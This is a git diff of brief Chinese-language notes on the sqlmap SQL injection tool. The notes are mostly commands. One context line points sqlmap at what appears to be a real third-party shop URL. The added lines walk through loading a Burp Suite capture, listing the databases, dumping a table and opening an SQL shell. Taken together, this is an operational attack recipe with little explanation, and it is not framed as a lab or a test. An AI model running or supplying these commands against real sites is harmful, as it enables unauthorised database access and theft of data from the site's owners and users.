@@ -4,3 +4,15 @@ git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 
 对于后端是mysql的数据库进行注入测试
 python sqlmap.py -u 'http://www.yunqixiu.com/legend/shop/warehouse/order/info/ng?id=136886' --level 2 --dbms=mysql
+
+把burq suite截取的信息贴到文件中
+sqlmap -r ./kissme.txt
+
+然后 map database
+sqlmap -r ./kissme.txt --dbs
+
+然后执行 取数据
+sqlmap -r ./kissme.txt -D fat -T a --dump
+
+获取客户端界面
+sqlmap -r ./kissme.txt -D fat -T a --sql-shell
